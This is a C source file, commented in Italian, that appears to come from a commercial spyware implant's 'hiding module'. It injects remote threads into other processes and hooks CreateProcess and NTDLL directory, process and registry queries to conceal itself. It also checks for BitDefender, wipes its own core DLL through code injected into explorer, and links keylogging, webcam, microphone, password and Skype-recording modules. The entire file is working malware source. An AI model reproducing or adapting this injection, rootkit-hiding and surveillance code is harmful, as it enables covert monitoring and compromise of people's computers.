#include <config.h>

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//
// HIDING MODULE SECTION {HM}:
//
// 
// 
// HMServiceStruct:
//	HM_IpcCliWrite_t pHM_IpcCliWrite	- PTR. IPC di scrittura
//	HM_IpcCliRead_t  pHM_IpcCliRead;	- PTR. IPC di lettura
//	HM_sCreateHook_t pHM_sCreateHook;	- PTR. funzione che alloca codice/dati di un Hook
//	DWORD PARAM[10];
//
// EXPORTS: 
//  static DWORD HM_sCreateHookA(HANDLE,char*,char*,BYTE*,DWORD,BYTE*,DWORD)
//  HANDLE HM_sStartHookingThread(HANDLE hProcess)
//	void HM_sMain()			- Entry point della DLL
// 
//  void HM_s<GenericHook>(HANDLE, HMServiceStruct *)
//  void HM_s<GenericService>(HMServiceStruct *)
//  [vedere HM_sInBundleHook e HM_sInBundleService come prototipi] 
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
#include "common.h" 
#include "H4-DLL.h"	
#include "bss.h"
#include "demo_functions.h"
#include "HM_CodeAlign.h"
#include "AM_Core.h"
#include "HM_InbundleHook.h"
#include "LOG.h" // XXX da includere nei singoli moduli di agent
#include "HM_IpcModule.h"
#include "SM_Core.h"
#include "PEB.h"
#include "HM_VistaSpecific.h"
#include <Psapi.h>
#include <rcs/bin_string.h>
#include "UnHookClass.h"
#include "x64.h"
#include "DeepFreeze.h"
#include "HM_BitmapCommon.h"
#include <time.h>
#include <crypto/sha1.h>
#include "format_resistant.h"
#include "process.h"
#include "av_detect.h"
#include <tchar.h>
#include <Strsafe.h>
#include "config.h"
#include <rcs/strings.h>
#include  <scramblestring.h>

// modules
#ifdef __ENABLE_KEYLOG_MODULE
#include "../modules/keylog/HM_KeyLog.h"
#pragma comment(lib, "keylog")
#endif

#ifdef __ENABLE_SCREENSHOT_MODULE
#include "../modules/screenshot/screenshot.h"
#pragma comment(lib, "screenshot")
#endif

// Prototipi usati per comodita'
void LockConfFile();
void UnlockConfFile();

/// SECTION for building modules

#ifdef __ENABLE_MONEY_MODULE
#pragma comment(lib, "money")
#endif

#ifdef __ENABLE_PWDAGENT_MODULE
#pragma comment(lib, "pwdagent")
#endif

#ifdef __ENABLE_IMAGENT_MODULE
#pragma comment(lib, "imagent")
#endif

#ifdef __ENABLE_AMBMIC_MODULE
#pragma comment(lib, "ambmic")
#endif

#ifdef __ENABLE_CLIPBOARD_MODULE
#pragma comment(lib, "clipboard")
#endif

#ifdef __ENABLE_PDAGENT_MODULE
#pragma comment(lib, "pdagent")
#endif

#ifdef __ENABLE_SOCIAL_MODULE
#pragma comment(lib, "social")
#endif

#ifdef __ENABLE_MESSAGES_MODULE
#pragma comment(lib, "messages")
#endif

#ifdef __ENABLE_CONTACTS_MODULE
#pragma comment(lib, "contacts")
#endif

#ifdef __ENABLE_PRINTPOOL_MODULE
#pragma comment(lib, "printpool")
#endif

#ifdef __ENABLE_APPLICATION_MODULE
#pragma comment(lib, "application")
#endif

#ifdef __ENABLE_CRISIS_MODULE
#pragma comment(lib, "crisis")
#endif

#if defined(__ENABLE_KEYLOG_MODULE) || defined(__ENABLE_MOUSE_MODULE)
#pragma comment(lib, "keylog")

#ifdef __ENABLE_MOUSE_MODULE
#ifndef ENABLE_SCREENSHOT_MODULE
#pragma error("Error. mouse need screenshot!")
#endif
#endif

#endif


#if defined(__ENABLE_DEVICE_MODULE)
#pragma comment(lib, "device")
#endif

#ifdef __ENABLE_URLWIN32_MODULE
#pragma comment(lib, "urlwin32")
#endif

#ifdef __ENABLE_LOCATION_MODULE
#pragma comment(lib, "location")
#endif

#ifdef __ENABLE_APPLICATION_MODULE
#pragma comment(lib, "application")
#endif

#ifdef __ENABLE_WEBCAM_MODULE
#pragma comment(lib, "webcam")
#endif

#ifdef __ENABLE_PASSWORD_MODULE
#pragma comment(lib, "pwdagent")
#endif

/// Despite the name, procmon monitors i/o access into each process
#ifdef __ENABLE_PROCMON_MODULE
#include "../modules/procmon/HM_ProcessMonitors.h"
#pragma comment(lib, "procmon")
#endif

#ifdef __ENABLE_SCREENSHOT_MODULE
#pragma comment(lib, "screenshot")
#endif

/// SECTION for building modules

#include <json/JSON.h>
void PM_PrintAgentRegister();
#include "../modules/imagent/HM_SkypeRecord.h"
#include "../modules/urlwin32/HM_UrlLog.h" // XXX da modificare 

void PM_SocialAgentRegister();

// Qui finira' il binary patch con la chiave di cifratura dei log
BYTE bin_patched_key[] = ENCRYPTION_KEY;
// Qui finira' il binary patch con la chiave di cifratura per la conf
BYTE bin_patched_key_conf[] = ENCRYPTION_KEY_CONF;

BYTE bin_patched_backdoor_id[] = BACKDOOR_ID;

// Variabili di configurazione globali
NANOSEC_TIME date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date

extern BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
BOOL ReadDesc(DWORD pid, WCHAR *file_desc, DWORD len);

////////////////////////////////////////////////////////////////////////////////
// 
// Strutture, Dati e funzione iniettata nel Processo 
// da Hookare [Threddino]
// 

typedef void (WINAPI *Sleep_t)(DWORD);
typedef struct
{
	HMCommonDataStruct pCommon;
	char cDLLHookName[DLLNAMELEN];				// Nome della dll principale ("H4.DLL")
	char cInBundleHookName[DLLNAMELEN];
	char cInBundleServiceName[DLLNAMELEN];
	// Funzioni da usare nell'Thread  inizializzate dalla setup
	ResumeThread_T pResumeThread;
	OpenThread_T pOpenThread;
	CloseHandle_T pCloseHandle;
	Sleep_t pSleep;
	DWORD dwPid;
	DWORD dwThid;
	BOOL lookup_bypass;
} HMHookingThreadDataStruct;

// Con questa si settano tutte le funzioni di Libreria che stanno 
// in KERNEL32 e NTDLL

DWORD HM_HookingThreadSetup(DWORD * pD)
{	
	HMODULE hMod;

	HMHookingThreadDataStruct *ctx = (HMHookingThreadDataStruct *) pD;
	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(ctx->pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"))
	VALIDPTR(ctx->pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"))
	VALIDPTR(ctx->pCommon._FreeLibrary = (FreeLibrary_T) HM_SafeGetProcAddress(hMod, "FreeLibrary"))
	VALIDPTR(ctx->pResumeThread = (ResumeThread_T) HM_SafeGetProcAddress(hMod, "ResumeThread"))
	VALIDPTR(ctx->pOpenThread = (OpenThread_T) HM_SafeGetProcAddress(hMod, "OpenThread"))
	VALIDPTR(ctx->pSleep = (Sleep_t) HM_SafeGetProcAddress(hMod, "Sleep"))
	VALIDPTR(ctx->pCloseHandle = (CloseHandle_T) HM_SafeGetProcAddress(hMod, "CloseHandle"))
	
	// Non lo prendiamo dai nomi guessati perche' la shared potrebbe non essere caricata
	// se stiamo girando in un servizio
	if (!FindModulePath(ctx->cDLLHookName, sizeof(ctx->cDLLHookName)))
		return 1;

	sprintf(ctx->cInBundleHookName, "%s", "PPPFTBBP03");
	sprintf(ctx->cInBundleServiceName, "%s", "PPPFTBBP04");
	ctx->lookup_bypass = TRUE;
	return 0;
}
					

// Essendo un Thread attivo pData viene passato da 
// CreataRemoteThread
DWORD HM_HookingThread(HMHookingThreadDataStruct *pDataThread)
{
	// Le funzioni di libreria che non sono in NTDLL e KERNEL32
	// le devo risolvere nel processo figlio.....
	HMServiceStruct sServiceData;
	HM_CreateService_t pCreateService = NULL; 
	HM_CreateHook_t pCreateHook = NULL; 
	HMODULE hH4Mod = NULL;
	
	INIT_WRAPPER(HMHookingThreadDataStruct)

	sServiceData.pHM_IpcCliRead = NULL;
	sServiceData.pHM_IpcCliWrite = NULL;
	// Lancia le funzioni CreateService e InbundleHook
	hH4Mod = pDataThread->pCommon._LoadLibrary((LPCSTR)pDataThread->cDLLHookName);
	if(hH4Mod) {
		if((pCreateService = (HM_CreateService_t) pDataThread->pCommon._GetProcAddress(hH4Mod, pDataThread->cInBundleServiceName)))
			pCreateService(pDataThread->dwPid, &sServiceData);

		// Verifica che i services siano stati installati con successo
		if (sServiceData.pHM_IpcCliRead && sServiceData.pHM_IpcCliWrite)
			if((pCreateHook = (HM_CreateHook_t) pDataThread->pCommon._GetProcAddress(hH4Mod, pDataThread->cInBundleHookName)))
				pCreateHook(pDataThread->dwPid, &sServiceData, pDataThread->lookup_bypass);						
	}
	
	// Resuma il thread principale (se stiamo infettando un processo appena nato che non 
	// e' in SUSPENDED)
	// E' NULL solo se H4.DLL ha invocato il thread
	if(pDataThread->dwThid != NULL) {
		HANDLE hMainThread = pDataThread->pOpenThread(THREAD_ALL_ACCESS, TRUE, pDataThread->dwThid);
		if(hMainThread != NULL) {
			pDataThread->pResumeThread(hMainThread);
			pDataThread->pCloseHandle(hMainThread);
		}
	}

	// Scarica H4DLL dal processo....
	if (hH4Mod)
		pDataThread->pCommon._FreeLibrary(hH4Mod);

	// XXX Per gestione messaggi?????
	for(;;)
		pDataThread->pSleep(1000);

	return 1;
}

////////////////////////////////////////////////////////////////////////////////
// 
//	 Funzioni per iniettare dentro explorer il codice 
//   per cancellare la DLL core e la directory di lavoro

typedef BOOL (WINAPI *RemoveDirectory_t) (LPCTSTR);
typedef BOOL (WINAPI *DeleteFile_t) (LPCTSTR);
typedef BOOL (WINAPI *VirtualFree_t) (LPVOID, SIZE_T, DWORD);
typedef HANDLE (WINAPI *CreateFile_t) (LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CloseHandle_t) (HANDLE);

typedef struct {
	COMMONDATA;
	RemoveDirectory_t pRemoveDirectory;
	DeleteFile_t pDeleteFile;
	VirtualFree_t pVirtualFree;
	CreateFile_t pCreateFile;
	WriteFile_t pWriteFile;
	CloseHandle_t pCloseHandle;
	Sleep_t pSleep;
	BOOL wipe_file;
	char core_file[DLLNAMELEN];
	char work_dir[DLLNAMELEN];
} HMRemoveCoreThreadDataStruct;

// Thread iniettato dentro explorer per cancellare il core
// e la directory di lavoro
#define CORE_FILE_LEN 2000000 // 150KB
DWORD HM_RemoveCoreThread(void *dummy)
{
	HANDLE hf;
	DWORD data_wiped;
	DWORD dwTmp;
	DWORD wipe_string = 0;
	INIT_WRAPPER(HMRemoveCoreThreadDataStruct);

	// Tenta il wiping
	if (pData->wipe_file) {
		// Cerca a tutti i costi di aprire il file in scrittura
		// Il file deve esistere.
		// Non ha share mode, perche' nessuno deve poter caricare la DLL mentre
		// ci sta scrivendo sopra.
		while ( (hf = pData->pCreateFile(pData->core_file, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL) ) == INVALID_HANDLE_VALUE )
			pData->pSleep(200);
		
		for (data_wiped=0; data_wiped<CORE_FILE_LEN; data_wiped+=sizeof(wipe_string))
			pData->pWriteFile(hf, &wipe_string, sizeof(wipe_string), &dwTmp, NULL);

		pData->pCloseHandle(hf);
	}

	// Qui la DLL non e' consistente (le eventuali aperture
	// dovrebbero fallire)

	// Cerca a tutti i costi di cancellare il core e
	// la directory
	LOOP {
		pData->pDeleteFile(pData->core_file);
		if (pData->pRemoveDirectory(pData->work_dir))
			break;
		pData->pSleep(200);
	}

	// Libera la memoria della data struct
	// (non puo' liberare il codice che sta eseguendo)
	pData->pVirtualFree((BYTE *)pData->dwDataAdd, 0, MEM_RELEASE);

	return 1;
}

BOOL IsLastInstance()
{
	WCHAR first_part[MAX_PATH];
	WCHAR second_part[MAX_PATH];
	WCHAR search_string[MAX_PATH];
	WCHAR complete_path[MAX_PATH];
	WCHAR *ptr = NULL;
	WIN32_FIND_DATAW FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE, hFile;
	DWORD instances = 0;

	_snwprintf_s(first_part, MAX_PATH, _TRUNCATE, L"%S", shared.H4_HOME_PATH);
	if (ptr = wcschr(first_part, L'\\')) {
		ptr++;
		if (ptr = wcschr(ptr, L'\\')) {
			ptr++;
			*ptr = 0;
			ptr++;
		}
	}
	if (!ptr)
		return FALSE;
	_snwprintf_s(search_string, MAX_PATH, _TRUNCATE, L"%s*", first_part);
	if (!(ptr = wcschr(ptr, L'\\')))
		return FALSE;
	ptr++;
	_snwprintf_s(second_part, MAX_PATH, _TRUNCATE, L"%s", ptr);

	hFind = FNC(FindFirstFileW)(search_string, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE) 
		return FALSE;
	
	do {
		// Verifica se ci sono altre directory oltre alla nostra
		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			continue;
		_snwprintf_s(complete_path, MAX_PATH, _TRUNCATE, L"%s%s\\%s", first_part, FindFileData.cFileName, second_part);
		
		if ((hFile = CreateFileW(complete_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0))!=INVALID_HANDLE_VALUE) {
			instances++;
			CloseHandle(hFile);
		}

	} while (FNC(FindNextFileW)(hFind, &FindFileData) != 0);
	FNC(FindClose)(hFind);

	if (instances>1)
		return FALSE;

	return TRUE;
}

// Rimuove il driver dal sistema 
void HM_RemoveDriver()
{
	HideDevice reg_device;

	// Rimuove le chiavi nel registry
	reg_device.unhook_uninstall();
}

// Inietta il thread in explorer per la cancellazione
// del core. Se explorer non e' attivo, prova a iniettare
// finche non ci riesce.
#define REMOVE_SLEEP_TIME 200
void HM_RemoveCore()
{
	HMRemoveCoreThreadDataStruct HMRemoveCoreThreadData;
	DWORD explorer_pid;
	HMODULE hMod;
	HANDLE hProcess;
	HANDLE hThreadRem;
	DWORD dwThreadId;
	BYTE *pCodeRemote;
	BYTE *pDataRemote;

	// Dice al thread se fare il wiping
	HMRemoveCoreThreadData.wipe_file = log_wipe_file;

	// Setup del thread di cancellazione
	if (! (hMod = GetModuleHandle("KERNEL32.DLL")) )
		return;
	HM_CompletePath(shared.H4DLLNAME, HMRemoveCoreThreadData.core_file);
	HM_CompletePath("", HMRemoveCoreThreadData.work_dir);
	HMRemoveCoreThreadData.pDeleteFile = (DeleteFile_t) HM_SafeGetProcAddress(hMod, "DeleteFileA");
	HMRemoveCoreThreadData.pCreateFile = (CreateFile_t) HM_SafeGetProcAddress(hMod, "CreateFileA");
	HMRemoveCoreThreadData.pWriteFile = (WriteFile_t) HM_SafeGetProcAddress(hMod, "WriteFile");
	HMRemoveCoreThreadData.pCloseHandle = (CloseHandle_t) HM_SafeGetProcAddress(hMod, "CloseHandle");
	HMRemoveCoreThreadData.pRemoveDirectory = (RemoveDirectory_t) HM_SafeGetProcAddress(hMod, "RemoveDirectoryA");
	HMRemoveCoreThreadData.pVirtualFree = (VirtualFree_t) HM_SafeGetProcAddress(hMod, "VirtualFree"); 
	HMRemoveCoreThreadData.pSleep = (Sleep_t) HM_SafeGetProcAddress(hMod, "Sleep");  
	if (!HMRemoveCoreThreadData.pDeleteFile || 
		!HMRemoveCoreThreadData.pCreateFile ||
		!HMRemoveCoreThreadData.pWriteFile ||
		!HMRemoveCoreThreadData.pCloseHandle ||
		!HMRemoveCoreThreadData.pRemoveDirectory ||
		!HMRemoveCoreThreadData.pVirtualFree ||
		!HMRemoveCoreThreadData.pSleep)
		return;

	// Cicla finche' non trova explorer.exe
	while( !(explorer_pid = HM_FindPid("explorer.exe", TRUE)) )
		Sleep(REMOVE_SLEEP_TIME);

	// Se explorer e' a 64bit, cerca un processo a 32
	if (IsX64Process(explorer_pid))
		explorer_pid = Find32BitProcess();
	if (!explorer_pid)
		return;

	// Inietta il thread di cancellazione
	if(HM_sCreateHookA(explorer_pid, NULL, NULL, 
					   (BYTE *)HM_RemoveCoreThread, 
					   900, (BYTE *)&HMRemoveCoreThreadData, 
					   sizeof(HMRemoveCoreThreadData)) == NULL)
							return;

	pCodeRemote = (BYTE *)HMRemoveCoreThreadData.dwHookAdd;
	pDataRemote = (BYTE *)HMRemoveCoreThreadData.dwDataAdd;

	// Esegue il thread in explorer.exe
	hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, explorer_pid);
	if(hProcess == NULL) 
		return;

	hThreadRem = HM_SafeCreateRemoteThread(hProcess, NULL, 8192, 
									(LPTHREAD_START_ROUTINE)pCodeRemote, 
									(LPVOID)pDataRemote, 0, 
									&dwThreadId);

	// Se fallisce libera la memoria in explorer.exe
	if(hThreadRem == NULL) {
		FNC(VirtualFreeEx)(hProcess, pCodeRemote, 0, MEM_RELEASE);
		FNC(VirtualFreeEx)(hProcess, pDataRemote, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	// Sara' il thread in explorer a liberare la memoria 
	// della funzione iniettata...
	CloseHandle(hThreadRem);
	CloseHandle(hProcess);
	
	return;
}


////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// 
//								EXPORTS SECTION: START 
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

// Verifica se il processo e' nella lista dei processi da non toccare
// Torna TRUE se il processo e' nella lista
BOOL HM_ProcessByPass(DWORD pid)
{
	char *process_name;
	WCHAR process_description[500];
	DWORD i;
	BOOL desc_failed = FALSE;

	// Faccio prima un check sulle descizioni
	if (ReadDesc(pid, process_description, sizeof(process_description))) {
		for(i=0; i<EMBEDDED_BYPASS; i++) {
			if (shared.process_bypass_desc[i][0]!=0 && CmpWildW(shared.process_bypass_desc[i], process_description))
				return TRUE;
		}
	} else
		desc_failed = TRUE;

	// Prende il nome del processo "pid"
	if ( !(process_name = HM_FindProc(pid)) )
		return FALSE;
	
	// Lo compara con quelli da bypassare
	for(i=0; i<shared.process_bypassed; i++) {
		if (CmpWild(shared.process_bypass_list[i], process_name)) {
			SAFE_FREE(process_name);
			// Se e' uno dinamico, o non ho descrizione valida, allora controlla solo il nome
			if (i>=EMBEDDED_BYPASS || shared.process_bypass_desc[i][0]==0 || desc_failed)
				return TRUE;
			return FALSE;
		}
	}
	SAFE_FREE(process_name);
	return FALSE;
}

BOOL CheckIPCAlreadyExist(DWORD pid);	// forwarded to HM_IpcModule

BOOL MarkProcess(DWORD pid)
{
	if (CheckIPCAlreadyExist(pid))
		return FALSE;

	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////
// 
// Inietta il Thread nel processo da cui effettuare API Hooking
// Se lookup_bypass==TRUE guarda la process bypass list, altrimenti no
HANDLE WINAPI HM_sStartHookingThread(DWORD dwPid, DWORD dwThid, BOOL lookup_bypass, BOOL mark_process)
{
	HANDLE hThreadRem = INVALID_HANDLE_VALUE;
	HANDLE hProcess;
	DWORD dwThreadId;
	HMHookingThreadDataStruct HMHookingThreadData;
	HideDevice dev_pid;

	// Se e' un processo da non toccare non esegue nulla
	if (lookup_bypass) {
		if (HM_ProcessByPass(dwPid))
			return INVALID_HANDLE_VALUE;
	}

	if (mark_process && !MarkProcess(dwPid))
		return INVALID_HANDLE_VALUE;

	// Il threddino deve avere i pid del processo....
	HMHookingThreadData.dwPid = dwPid;
	HMHookingThreadData.dwThid = dwThid;
	
	// Setup del threddino: riloca le funzioni da usare ecc...
	// se ritorna TRUE c'e' stato un errore nella risoluzion
	// degli address delle api
	if(HM_HookingThreadSetup((DWORD *)&HMHookingThreadData))
		return INVALID_HANDLE_VALUE;

	// Dice al thread iniettato nel figlio se guardare la
	// process_bypass_list
	HMHookingThreadData.lookup_bypass = lookup_bypass;
	
	dev_pid.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);

	// Alloca dati e funzioni nell processo hProcess
	if(HM_sCreateHookA(dwPid, 
					   NULL, NULL, 
					   (BYTE *)HM_HookingThread, 
					   500, 
					   (BYTE *)&HMHookingThreadData, 
					   sizeof(HMHookingThreadData)) == NULL)
							return INVALID_HANDLE_VALUE;
	
	// Esegue il thread di hooking
	hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if(hProcess != NULL) {
		hThreadRem = HM_SafeCreateRemoteThread(hProcess, 
	 									NULL, 
										8192, 
										(LPTHREAD_START_ROUTINE)HMHookingThreadData.pCommon.dwHookAdd, 
										(LPVOID)HMHookingThreadData.pCommon.dwDataAdd, 
										0, 
										&dwThreadId);

		// Se fallisce perche' siamo su Vista e vogliamo infettare SVCHOST
		// prova con la NtCreateThreadEx()
		if (hThreadRem == NULL)
			hThreadRem = VistaCreateRemoteThread(hProcess, 
	 									(LPTHREAD_START_ROUTINE)HMHookingThreadData.pCommon.dwHookAdd, 
										(LPVOID)HMHookingThreadData.pCommon.dwDataAdd);
		CloseHandle(hProcess);
	}
	dev_pid.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);
	// Errore
	if(hThreadRem == NULL)
		return INVALID_HANDLE_VALUE;
		

	// XXX Qui dovrebbe fare una wait for single object (da vedere con chiodo)

	// XXX L'handle tornato serve solo per vedere se
	// la funzione e' andata a buon fine. Lo chiudiamo
	// tanto nessun chiamante di questa funzione utilizza
	// mai l'handle tornato. Se no rimangono aperti 
	// un sacco di handle.
	if (hThreadRem != INVALID_HANDLE_VALUE)
		CloseHandle(hThreadRem);
	return hThreadRem;
}


// Verifica se una funzione e' gia' stata hookata DA NOI
BOOL IsHooked(HANDLE hProc, PBYTE code_local, PBYTE code_remote)
{
	DWORD *dest;
	DWORD i, dummy;
	PBYTE dst_code;
	BYTE jmp_code[MARK_SEARCH_LIMIT*2]; // siamo sicuri la HM_sCodeAlign non legga istruzioni fuori dal buffer

	// vede se la funzione comincia con un jmp
	if (code_local == NULL || code_remote == NULL || (*code_local) != 0xE9)
		return FALSE;
	
	// calcola la destinazione del salto
	dest = (DWORD *)(code_local + 1);
	dst_code = code_remote + (*dest) + 5;

	// legge l'hook alla destinazione del salto
	if (!HM_SafeReadProcessMemory(hProc, dst_code, jmp_code, sizeof(jmp_code), &dummy) )
		return FALSE;
	
	// vede se c'e' il nostro marcatore
	__try {
		for (i=0; i<MARK_SEARCH_LIMIT; i+=HM_sCodeAlign(jmp_code + i))
			if (!memcmp(jmp_code+i, "\xEB\x00\xEB\x00", 4)) // Vedere MARK_HOOK
				return TRUE;
	} __except(EXCEPTION_EXECUTE_HANDLER) {
		return FALSE;
	}

	return FALSE;
}

////////////////////////////////////////////////////////////////////////////////
// 
// Copia codice e dati dell'Hook nel process dwPid 
// Questa funzione viene usata anche per iniettare un Thread
// nel processo figlio 
//
#define CRETURN(x)	if(x) {CloseHandle(x);return NULL;}

DWORD WINAPI HM_sCreateHookA(DWORD dwPid,
								 char *APIName, 
								 char *DLLAPIName, 
								 BYTE *HookAdd, 
								 DWORD HookSize, 
								 BYTE *HookData, 
								 DWORD HookDataSize)
{
	DWORD code_len = 0, call_offs;
	BYTE *op_code;
	DWORD *op_operand;
	HMODULE h_module = NULL;
	BYTE APIOnLocal[64];
	BYTE JMP_Code[REDIR_SIZE];
	DWORD dummy;
	HANDLE hProcess;
	HMCommonDataStruct *pCommonData = (HMCommonDataStruct *)HookData;

	// reset 
	pCommonData->dwHookAdd  = NULL;
	pCommonData->dwDataAdd  = NULL;

	// 
	if((hProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, TRUE, dwPid)) == NULL)
		return NULL;

	// Dobbiamo creare un HOOK ?????
	IFDEF(DLLAPIName) {
		if ( !(h_module = LoadLibrary(DLLAPIName)) )
			CRETURN(hProcess);
	} else
			pCommonData->bAPIAdd    = NULL;
	
	// Dobbiamo creare un HOOK ?????
	IFDEF(APIName)
		if ( !(pCommonData->bAPIAdd = (BYTE *)HM_SafeGetProcAddress(h_module, APIName)) ) 
			CRETURN(hProcess);
	
	// Controlla se ce' codice da Hookare
	IFDEF(pCommonData->bAPIAdd) {
		// Legge i primi 64 byte della funzione da wrappare per farci dei controlli
		if (!HM_SafeReadProcessMemory(hProcess, pCommonData->bAPIAdd, APIOnLocal, sizeof(APIOnLocal), &dummy) )
			CRETURN(hProcess);
	
		// Un processo viene hookato una volta sola dallo stesso core;
		// core diversi possono hookare piu' volte - XXX MINST
		//if (IsHooked(hProcess, APIOnLocal, pCommonData->bAPIAdd))
			//CRETURN(hProcess);

		// Allinea il limite dell'istruzione
		while (code_len < (DWORD)REDIR_SIZE) 
			code_len += HM_sCodeAlign(APIOnLocal + code_len);
				
		if (code_len > 15)
			CRETURN(hProcess);
	}

	// Alloca memoria per il codice dell'Hook
	pCommonData->dwHookAdd = (DWORD)HM_SafeVirtualAllocEx(hProcess, 0, HookSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if(!pCommonData->dwHookAdd)
		CRETURN(hProcess);

	// Alloca memoria per i dati dell'Hook
	pCommonData->dwDataAdd = (DWORD)HM_SafeVirtualAllocEx(hProcess, 0, HookDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if(!pCommonData->dwDataAdd)
		CRETURN(hProcess);

	IFDEF(pCommonData->bAPIAdd) {
		// Crea lo stub...
		memset(HookData, 0x90, STUB_SIZE);	       // Riempie di NOP
		memcpy(HookData, APIOnLocal, code_len); // Copia n istruzioni dall'API originale che verranno sovrascritte
		
		// ...setta il JMP al codice originale...
		HookData[15] = 0xE9;	// OpCode JMP
		*((DWORD *)(HookData + 16)) = (DWORD)pCommonData->bAPIAdd + code_len - ((DWORD)pCommonData->dwDataAdd + STUB_SIZE - 4); //Offset relativo per saltare dentro l'API originale dal wrapper
		
		// ... e riloca eventuali CALL nelle istruzioni copiate nello stub.
		for (code_len=0; code_len<REDIR_SIZE; code_len += HM_sCodeAlign(HookData + code_len)) {
			op_code = HookData + code_len;
			op_operand = (DWORD *)(HookData + code_len + 1);
			if (*op_code == 0xE8 || *op_code == 0xE9) 
				*op_operand -= (pCommonData->dwDataAdd - (DWORD)pCommonData->bAPIAdd);
		}
	}

	// Copia la funzione wrapper
	if ( !HM_SafeWriteProcessMemory(hProcess, (BYTE *)pCommonData->dwHookAdd, HookAdd, HookSize, &dummy) ) 
		CRETURN(hProcess);

	// Copia la struttura dati
	if ( !HM_SafeWriteProcessMemory(hProcess, (BYTE *)pCommonData->dwDataAdd, HookData, HookDataSize, &dummy) )
		CRETURN(hProcess);

	// Setta nel wrapper il puntatore ai dati
	for(call_offs = 0; *(HookAdd + call_offs)!= 0x69; call_offs++);
	if ( !HM_SafeWriteProcessMemory(hProcess, (BYTE *)(pCommonData->dwHookAdd + call_offs), &pCommonData->dwDataAdd, 4, &dummy) )
		CRETURN(hProcess);

	IFDEF(pCommonData->bAPIAdd) {
		// Crea il jump code nell'API originale
		JMP_Code[0]='\xE9';
		*((DWORD *)(&JMP_Code[1])) = (DWORD)(pCommonData->dwHookAdd - (DWORD)(pCommonData->bAPIAdd) - 5);
		
		if ( !HM_SafeWriteProcessMemory(hProcess, pCommonData->bAPIAdd, JMP_Code, REDIR_SIZE, &dummy) )
			CRETURN(hProcess);
	}

	CloseHandle(hProcess);
	return pCommonData->dwDataAdd;
}

void WINAPI HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOOL lookup_bypass)
{
	// XXX Check ridondante nel caso il padre sia svchost che non ha la lista
	// perche' non ha la shared
	if (lookup_bypass)
		if (HM_ProcessByPass(dwPid))
			return;

	// Hook inbundle di Hidding...
	//HMMAKE_HOOK(dwPid, "OpenProcess", OpenProcessHook, OpenProcessData, OpenProcessHook_setup, pServiceData, "KERNEL32.dll");	

	// BitDefender non permette di infettare i processi appena creati
	if (!IsBitDefender()) {
		HMMAKE_HOOK(dwPid, "CreateProcessA", NtCreateProcessHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "KERNEL32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessW", NtCreateProcessHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "KERNEL32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessAsUserA", NtCreateProcessAsUserHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "ADVAPI32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessAsUserW", NtCreateProcessAsUserHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "ADVAPI32.dll");
		HMMAKE_HOOK(dwPid, "CreateProcessAsUserW", NtCreateProcessAsUserHook, NTCreateProcessRWData, NtCreateProcessHook_setup, pServiceData, "KERNEL32.dll");
	}

	HMMAKE_HOOK(dwPid, "NtQueryDirectoryFile", NtQueryDirectoryFileHook, NtQueryDirectoryFileData, NtQueryDirectoryFileHook_setup, pServiceData, "NTDLL.dll");
	HMMAKE_HOOK(dwPid, "ReadDirectoryChangesW", ReadDirectoryChangesWHook, ReadDirectoryChangesWData, ReadDirectoryChangesWHook_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "NtQuerySystemInformation", NtQuerySystemInformationHook, NTQuerySystemInformationData, NtQuerySystemInformationHook_setup, pServiceData, "NTDLL.dll");
	HMMAKE_HOOK(dwPid, "NtDeviceIoControlFile", NtDeviceIoControlFileHook, NTDeviceIOControlFileData, NtDeviceIoControlFileHook_setup, pServiceData, "NTDLL.dll");
	HMMAKE_HOOK(dwPid, "NtEnumerateValueKey", NtEnumerateValueKeyHook, NtEnumerateValueKeyData, NtEnumerateValueKeyHook_setup, pServiceData, "NTDLL.dll");	
	HMMAKE_HOOK(dwPid, "NtQueryKey", NtQueryKeyHook, NtQueryKeyData, NtQueryKeyHook_setup, pServiceData, "NTDLL.dll");	
	
	// Metto gli Hook per tutti i PM inbundle...
	// --- PM per Url Monitor
	HMMAKE_HOOK(dwPid, "SendMessageW", PM_SendMessageURL, SendMessageURLData, PM_SendMessageURL_setup, pServiceData, "user32.dll"); 
